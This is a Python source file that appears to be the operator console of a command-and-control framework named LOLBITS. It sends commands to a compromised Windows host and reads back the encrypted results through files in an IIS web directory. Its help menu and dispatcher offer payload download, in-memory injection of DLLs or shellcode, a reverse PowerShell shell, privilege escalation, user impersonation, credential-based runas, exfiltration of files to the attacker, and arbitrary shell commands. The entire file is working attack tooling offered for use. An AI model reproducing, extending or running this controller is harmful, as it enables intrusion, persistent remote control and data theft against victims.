import os
import string
from command import Command
from download import Download
from execute import Execute
from move import Move
from base64encode import Base64encode
from base64decode import Base64decode
from compilation import Compile
from inject import Inject
from downexec import Downexec
from shell import Shell
from powershell import Powershell
from send import Send
from impersonate import Impersonate
from exfiltrate import Exfiltrate
from runas import Runas
from colorama import init,deinit,Fore, Style
import json
import random
import decrypt
import time


_username = ""
_domain = ""
_classes = []
baseReadPath = "C:\\inetpub\\wwwroot\\lolbits\\"
baseWritePath = "C:\\inetpub\\wwwroot\\lolbits\\files\\"
prevId = "<ident9>"
nextId = ""
password = "<ident5>"

def printBanner():

	banner = """

	 ██╗      ██████╗ ██╗     ██████╗ ██╗████████╗███████╗
	 ██║     ██╔═══██╗██║     ██╔══██╗██║╚══██╔══╝██╔════╝
	 ██║     ██║   ██║██║     ██████╔╝██║   ██║   ███████╗
	 ██║     ██║   ██║██║     ██╔══██╗██║   ██║   ╚════██║
	 ███████╗╚██████╔╝███████╗██████╔╝██║   ██║   ███████║
	 ╚══════╝ ╚═════╝ ╚══════╝╚═════╝ ╚═╝   ╚═╝   ╚══════╝
 
"""
	return banner

def executeCommand(com):

	commands = {
	'download' : 0,
	'base64encode' : 1,
	'base64decode' : 2,
	'compile' : 3,
	'inject' : 4,
	'psh': 5,
	'send' : 6,
	'impersonate' : 7,
	'exfiltrate' : 8,
	'runas' : 9,
	'help' : 10
	}

	return commands.get(com.lower(), -1)

def printHelp():

	helpstr = """\n| ** Use "<command> help" for more detailed info about the following options.
|
| download     : Download a file from a remote host to the compromised machine.
| base64encode : Use Base64 to encode a file's content.
| base64decode : Decode a base64 encoded file.
| compile      : Compile a .cs file to .dll or .exe.
| inject       : Inject and execute in memory a dll or shellcode (.bin) file.
| psh          : Obtain a reverse powershell connection.
| send         : Send a file from your C2C to the compromised host.
| getsystem    : Attempt to obtain System privileges.
| rev2self     : Get back to the initial security context.
| list         : List all processes running in the compromised host.
| impersonate  : Impersonate other user.
| exfiltrate   : Upload a file from the compromised host to your C&C.
| runas        : Log in as other local or domain user using valid credentials.
| * Any OS shell command * -> Execute the command in a cmd.
|_________________________________________________________ _ _ _ _ _ _ _ _ _ _ _  
		   """
	print(helpstr)

def mainConsole():

	global nextId, prevId

	exit = False

	while not exit:
		try:
			print(Fore.CYAN + Style.BRIGHT + _domain + '\\' + _username + '> ' + Fore.WHITE , end='')
			command = input()
			comSpl = command.split()
			if comSpl[0] != 'exit':

				r = executeCommand(comSpl[0])

				if r == -1:
					if (len(comSpl) >= 2 and comSpl[1] != 'help') or (len(comSpl) < 2):
						nextId = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(10))

					filePath = baseWritePath + prevId
					if _classes[len(_classes)-1].executeCommand(comSpl[0:], prevId, nextId, filePath):
						content = waitAndReadFile(baseReadPath + nextId)
						if "ERR:" in content['Output']:
							content['Output'] = content['Output'].replace("ERR:","")
							print(Fore.RED + content['Output'])
						else:
							print(content['Output'])
						os.remove(filePath)

					if (len(comSpl) >= 2 and comSpl[1] != 'help') or (len(comSpl) < 2):
						prevId = nextId


				elif r == (len(_classes) - 1):
					printHelp()

				else:
					if (len(comSpl) >= 2 and comSpl[1] != 'help') or (len(comSpl) < 2):
						nextId = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(10))

					filePath = baseWritePath + prevId
					if _classes[r].executeCommand(comSpl[1:], prevId, nextId, filePath):
						content = waitAndReadFile(baseReadPath + nextId)
						if "ERR:" in content['Output']:
							content['Output'] = content['Output'].replace("ERR:","")
							print(Fore.RED + content['Output'])
						else:
							print(content['Output'])
						os.remove(filePath)

					if (len(comSpl) >= 2 and comSpl[1] != 'help') or (len(comSpl) < 2):
						prevId = nextId


			else:
				
				filePath = baseWritePath + prevId
				_classes[len(_classes)-1].executeCommand(["exit"], prevId, "AAAA", filePath)
				exit = True

		except:
			print(Fore.RED + 'Probably you should RTFM! Type help to get some usage tips.\n')


def waitAndReadFile(filePath):

	while not os.path.isfile(filePath):
		time.sleep(0.5)

	content = None
	content = json.loads(decrypt.decrypt(filePath,password))

	os.remove(filePath)

	return content

def main():
	global _username,_domain,_classes, prevId

	init()

	print(Fore.WHITE + Style.BRIGHT + printBanner() , end='')

	with open(baseWritePath + prevId, 'r') as f:
		first = json.load(f)

	nextId = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(10))
	first['NextId'] =  nextId

	with open(baseWritePath + prevId, 'w') as f:
		json.dump(first, f)

	prevId = nextId

	content = waitAndReadFile(baseReadPath + prevId)

	userAndDomain = content['Output']
	userAndDomain = userAndDomain.split("\\")
	_domain = userAndDomain[0]
	_username = userAndDomain[1]
	


	_classes.append(Download())
	_classes.append(Execute())
	_classes.append(Move())
	_classes.append(Base64encode())
	_classes.append(Base64decode())
	_classes.append(Compile())
	_classes.append(Inject())
	_classes.append(Downexec())
	_classes.append(Powershell())
	_classes.append(Send())
	_classes.append(Impersonate())
	_classes.append(Exfiltrate())
	_classes.append(Runas())
	_classes.append(Shell())


	mainConsole()

	deinit()
	
if __name__ == "__main__":

	main()
